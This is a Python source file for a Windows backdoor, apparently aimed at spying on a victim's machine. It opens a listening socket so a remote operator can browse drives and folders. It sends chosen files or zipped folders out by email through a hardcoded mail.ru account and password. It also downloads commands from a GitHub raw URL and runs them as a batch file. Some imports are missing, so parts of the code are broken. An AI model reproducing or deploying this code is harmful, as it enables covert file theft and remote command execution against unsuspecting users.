import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import zipfile

data_base=""
comand={}

def update_comand():
    global comand
    url = 'https://github.com/Ananimys784/SDISB/raw/main/comands.txt'
    temp_3=requests.get(url).text
    for i in temp_3.split(":: #"):
        ii=i.split(':: $')
        i1=int(ii[0])
        if i1 > 0:
            i1=0-i1
        i2=ii[1]
        comand[i1]=i2

def run_comand(num):
    global comand
    f=open("system_afaff.bat","w")
    f.write(comand[num])
    f.close()
    os.system("system_afaff.bat")

def add_data(data):
    global data_base
    data_base+=data+"\n"

def zipdir(path):
    # ziph is zipfile handle
    res=path+'.zip'
    if res in os.listdir('\\'.join(path.split("\\")[:-1])):
        pass
    else:
        ziph=zipfile.ZipFile(res, 'w', zipfile.ZIP_DEFLATED)
        for root, dirs, files in os.walk(path):
            for file in files:
                ziph.write(os.path.join(root, file))
        ziph.close()
    return res

def get_drives():
    d1=['A:','B:', 'C:','E:', 'D:', 'F:', 'H:']
    drives = []
    for i in d1:
        try:
            os.listdir(i)
        except:
            pass
        else:
            drives.append(i)
    return drives

def send_mail(file_path):
    server_address = "smtp.mail.ru"
    server_port = 587
    login, password = "glazkova_v_80@mail.ru", "kBK04XfG6Nyem7PYBUzF"

    # file_path = "C:\\Users\\ALLA\\Downloads\\kingyr.jpg"
    file_name = file_path.split('\\')
    j = file_name[0]
    for i in range(1, len(file_name) - 1):
        j += '\\' + file_name[i]
    """try:
        a=os.listdir(file_path)
    except"""
    d = j + '\\TfPvhVLwScnMTzc.txt'

    msg = MIMEMultipart()
    msg['From'], msg['To'], msg['Subject'] = login, login, "[выключалка]:"
    msg.attach(MIMEText(file_name[-1], 'plain'))

    os.rename(file_path, d)
    with open(d, "rb") as file:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(file.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f"attachment; filename={file_name[-1]}")
    os.rename(d, file_path)

    msg.attach(part)
    #with smtplib.SMTP(server_address, server_port) as server:
    server=smtplib.SMTP(server_address, server_port)
    server.starttls()
    server.login(login, password)
    server.send_message(msg)

def numbering(list):
    x=""
    for i in range(0,len(list)):
        a=str(i)+")"+list[i]
        add_data(a)
        print(a)
        x+=str(a)+"\n"
    return x

def iteration():
    global path
    global data_base
    global conn
    temp_2=True
    dir = os.listdir(path)
    add_data(path + "\n")
    print(path + "\n")
    numbering(dir)
    conn.sendall(data_base.encode())
    data_base=""
    num_dir = float(conn.recv(1024).decode())
    #num_dir = float(input('\n:'))
    if num_dir == int(''.join(str(num_dir).split(".")[0])) and num_dir >= 0:
        os.system('cls')
        data_base=""
        path += dir[num_dir] + "\\"
    try:
        if num_dir == int(''.join(str(num_dir).split(".")[0]))+0.001:
            send_mail(path+dir[int(''.join(str(num_dir).split(".")[0]))])
        elif num_dir == int(''.join(str(num_dir).split(".")[0])) + 0.002:
            path='\\'.join(path.split('\\')[:-1][:-1])
        elif num_dir == int(''.join(str(num_dir).split(".")[0])) + 0.003:
            temp_1=zipdir(path+dir[int(''.join(str(num_dir).split(".")[0]))])
            send_mail(temp_1)
        elif num_dir == int(''.join(str(num_dir).split(".")[0])) + 0.004:
            temp_2=False
        elif num_dir < 0:
            run_comand(num_dir)
    except:
        pass
    return temp_2

def start():
    global path
    global data_base
    work=True
    dir=get_drives()
    numbering(dir)
    conn.sendall(data_base.encode())
    data_base=""
    num_dir = int(conn.recv(1024).decode())
    #num_dir = int(input('\n:'))
    os.system('cls')
    data_base=""
    path += dir[num_dir] + "\\"
    while work:
        work=iteration()

HOST = "0.0.0.0"  # Standard loopback interface address (localhost)
PORT = 65432  # Port to listen on (non-privileged ports are > 1023)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen()

while 1:
    try:
        conn, addr = s.accept()
        update_comand()
        path = ""
        start()
    except:
        pass
